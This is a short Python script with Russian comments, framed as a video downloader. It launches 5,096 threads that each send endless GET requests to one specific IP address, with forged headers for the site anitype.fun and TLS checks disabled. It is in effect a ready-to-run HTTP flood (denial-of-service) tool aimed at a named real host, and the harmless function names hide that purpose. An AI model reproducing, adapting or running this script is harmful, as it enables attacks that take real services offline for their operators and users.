import concurrent.futures
import logging
import requests
import urllib3  
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

video_url = "https://147.45.146.229/welcome"

# Определяем заголовки
headers = {
    'Origin': 'https://anitype.fun',
    'Referer': 'https://anitype.fun',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'Host': 'anitype.fun'
}

def download_video(url):
    try:
        # Отправляем запрос с куками и заголовками
        response = requests.get(url, stream=True, verify=False, headers=headers)
        logging.info(f"get url: {url}, status code: {response.status_code}")

    except Exception as e:
        logging.error(f"Error: {e}")
        return None

def process_video(url):
    while True:
        download_video(url)

def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=5096) as executor:
        for i in range(5096):
            executor.submit(process_video, video_url)

if __name__ == "__main__":
    main()
